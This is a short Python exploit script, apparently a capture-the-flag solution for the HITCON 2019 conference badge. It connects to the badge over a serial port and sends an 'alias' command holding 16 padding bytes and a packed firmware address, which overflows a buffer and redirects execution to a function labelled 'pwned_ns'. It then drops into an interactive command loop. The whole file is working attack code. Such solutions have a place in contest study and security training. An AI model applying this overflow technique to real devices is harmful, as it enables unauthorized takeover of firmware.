#!/usr/bin/env python
from pwn import *
import serial , re

context.arch = 'arm'

s = serial.Serial( '/dev/tty.usbmodem14101' )

def readuntil( n ):
    buf = ''
    while True:
        c = s.read()
        buf += c
        if n in buf:
            return buf

prompt = 'HitconBadge2019 >> '

def shell( cmd ):
    s.write( cmd + '\r' )
    o = readuntil( prompt )
    print o
    return o

def interactive():
    while True:
        try:
            cmd = raw_input().strip()
            if cmd == 'exit':
                break
            shell( cmd )
        except KeyboardInterrupt:
            break

winsnake = 0x100539f1
pwned_ns = 0x100538d9

p = 'a' * 0x10 + p32( pwned_ns )

shell( 'alias %s %s' % ( p , 'hello' ) )
shell( p )

interactive()